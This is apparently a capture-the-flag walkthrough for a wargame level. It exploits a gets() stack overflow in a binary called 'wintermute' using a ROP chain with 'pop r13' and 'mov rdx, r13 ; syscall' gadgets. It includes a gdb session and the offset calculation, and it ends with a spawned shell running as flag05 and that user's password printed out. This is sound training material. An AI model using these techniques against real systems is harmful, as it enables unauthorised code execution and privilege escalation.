## level05

`level05` starts off like the usual, a binary, README and a source file:

```bash
level05@rainfall:~$ ls
README  wintermute  wintermute.c
```

and running `checksec` on it we'll find that the `NX` bit is once again set to enabled:

```bash
level05@rainfall:~$ checksec ./wintermute
[*] '/home/level05/wintermute'
	Arch:       amd64-64-little
	RELRO:      Partial RELRO
	Stack:      No canary found
	NX:         NX enabled
	PIE:        No PIE (0x400000)
	SHSTK:      Enabled
	IBT:        Enabled
	Stripped:   No
```

Inspecting the source file, we seem to face a similar problem with `gets`. The issue resembles [`level03`](../../level03/resources/walkthrough.md), where we used a ROPgadget chain exploit. Since the `NX` bit is also enabled, we can apply the same technique. However, further investigation revealed that the `rdx` register is used in the `run_query` function, whereas we relied on it being null in previous levels. Therefore, we need to find another gadget to set `rdx` to `0` before calling `syscall`.

### Gadgets

After further investigation, we found no simple `pop rdx ; ret` gadget, but we did find a new `syscall` gadget and a `pop r13 ; ret` gadget. These can be used to set `rdx` to the value of `r13` before calling `syscall`, allowing us to set `rdx` to `0` and achieve our goal.


```bash
0x000000000009d14c : mov rdx, r13 ; syscall
```
```bash
0x00000000000584d9 : pop r13 ; ret
```

### Payload
The only thing left is to find the address of the `query` buffer and update our payload accordingly.


``` bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS"
(gdb) b run_query
Breakpoint 1 at 0x401431
(gdb) run < payload
Starting program: /home/level05/wintermute < payload
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  [WINTERMUTE] I am everywhere and nowhere.
  [WINTERMUTE] Neural query interface active.

Breakpoint 1, 0x0000000000401431 in run_query ()
(gdb) si
0x0000000000401435 in run_query ()
(gdb) si
0x000000000040143c in run_query ()                0
(gdb) i r $rsp
rsp            0x7fffffffe0a0      0x7fffffffe0a0
(gdb)
```

We also need to update our offsets to account for the added gadgets. The remaining task is to determine the offsets to reach `saved rbp` and `saved rip`. By inspecting the binary's `objdump`, we find that the function allocates `0x70` (112) bytes on the stack. Therefore, we need to fill the buffer with 112 bytes of junk to reach the saved `rbp` and `rip` addresses.

``` bash
0000000000401429 <run_query>:
  401429:	f3 0f 1e fa          	endbr64
  40142d:	55                   	push   %rbp
  40142e:	48 89 e5             	mov    %rsp,%rbp
  401431:	48 83 ec 70          	sub    $0x70,%rsp
```

By creating the payload as described and executing it, we successfully obtain a shell and retrieve our flag!

```bash
cat payload - | $PWD/wintermute 

[WINTERMUTE] Query: 
[WINTERMUTE] Hash: deadbeef
[WINTERMUTE] Matrix[0][0]: deadbef5
[WINTERMUTE] Node N000 weight=3
[WINTERMUTE] Node N002 weight=17
[WINTERMUTE] Node N004 weight=31

id
uid=1006(level05) gid=1008(level05) euid=1022(flag05) groups=1008(level05),1001(levelgroup)
cat /home/flag05/.pass
67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```
